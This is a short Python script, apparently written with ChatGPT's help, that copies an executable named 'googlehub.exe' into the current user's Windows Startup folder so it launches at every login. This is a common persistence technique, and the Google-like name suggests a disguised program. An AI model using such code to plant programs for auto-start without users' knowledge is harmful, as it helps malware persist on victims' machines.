# created by chatgpt 3.5, because i lazy create somethimg in python
import shutil
import os

# Получаем текущую директорию
current_directory = os.getcwd()

# Имя файла, который вы хотите скопировать
file_name = 'googlehub.exe'

# Полный путь к файлу
source_path = os.path.join(current_directory, file_name)

# Путь, куда вы хотите скопировать файл
destination_path = os.path.join('C:\\Users', os.getenv('USERNAME'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

shutil.copy(source_path, os.path.join(destination_path, file_name))

